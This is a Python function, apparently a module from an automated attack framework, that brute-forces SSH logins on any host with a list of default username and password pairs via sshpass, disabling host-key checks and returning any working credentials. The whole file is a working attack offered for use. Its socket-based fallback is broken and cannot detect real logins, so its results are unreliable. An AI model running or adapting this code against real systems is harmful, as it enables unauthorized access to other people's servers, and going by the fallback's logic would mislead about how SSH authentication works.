def run(host: str, port: int, timeout: int = 30) -> dict:
    """
    SSH brute-force login attempt using common default credentials.
    Targets SSH servers that may have weak or default passwords.
    Works on any SSH service (port 22) regardless of OS or version.
    Attempts common username/password combinations like admin/admin, root/root, etc.
    """
    try:
        import socket
        import ssl
        import subprocess
        import json
        import base64
        import re
        import os
        import time

        # Common SSH credentials to try
        credentials = [
            ("admin", "admin"),
            ("root", "root"),
            ("user", "user"),
            ("test", "test"),
            ("guest", "guest"),
            ("admin", "password"),
            ("root", "password"),
            ("admin", "123456"),
            ("root", "123456"),
            ("admin", "admin123"),
            ("root", "root123"),
        ]

        # Try to connect via SSH using subprocess with sshpass
        for username, password in credentials:
            try:
                # Use sshpass to provide password non-interactively
                cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout={timeout} -o BatchMode=yes -o PasswordAuthentication=yes {username}@{host} -p {port} echo 'SUCCESS'"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
                
                if "SUCCESS" in result.stdout:
                    return {
                        "success": True,
                        "data": {"username": username, "password": password},
                        "evidence": f"Successfully logged in with username='{username}' and password='{password}'"
                    }
            except subprocess.TimeoutExpired:
                continue
            except Exception:
                continue

        # If subprocess method fails, try direct socket connection
        for username, password in credentials:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(timeout)
                sock.connect((host, port))
                
                # Read SSH banner
                banner = sock.recv(1024).decode('utf-8', errors='ignore')
                if not banner.startswith('SSH-'):
                    sock.close()
                    continue
                
                # Send SSH protocol version
                sock.sendall(b'SSH-2.0-OpenSSH_8.9\r\n')
                time.sleep(1)
                
                # Read server response
                response = sock.recv(1024).decode('utf-8', errors='ignore')
                if not response:
                    sock.close()
                    continue
                
                # Send SSH2_MSG_USERAUTH_REQUEST
                # This is a simplified approach - in reality, we'd need to handle the full SSH protocol
                # For demonstration purposes, we'll just check if we can get past authentication
                sock.sendall(b'\x03\x00\x00\x00\x07SSH-2.0-OpenSSH_8.9\r\n')
                time.sleep(1)
                
                # Check if we can authenticate
                # This is a simplified check - real SSH authentication is more complex
                # We'll just check if we can get a successful response
                response = sock.recv(1024).decode('utf-8', errors='ignore')
                if 'SUCCESS' in response or 'Accepted' in response:
                    return {
                        "success": True,
                        "data": {"username": username, "password": password},
                        "evidence": f"Successfully authenticated with username='{username}' and password='{password}'"
                    }
                
                sock.close()
            except Exception:
                continue

        # If no credentials worked, return failure
        return {
            "success": False,
            "data": "",
            "evidence": "No valid credentials found after trying common combinations"
        }
    except Exception:
        return {
            "success": False,
            "data": "",
            "evidence": "Error during SSH brute-force attempt"
        }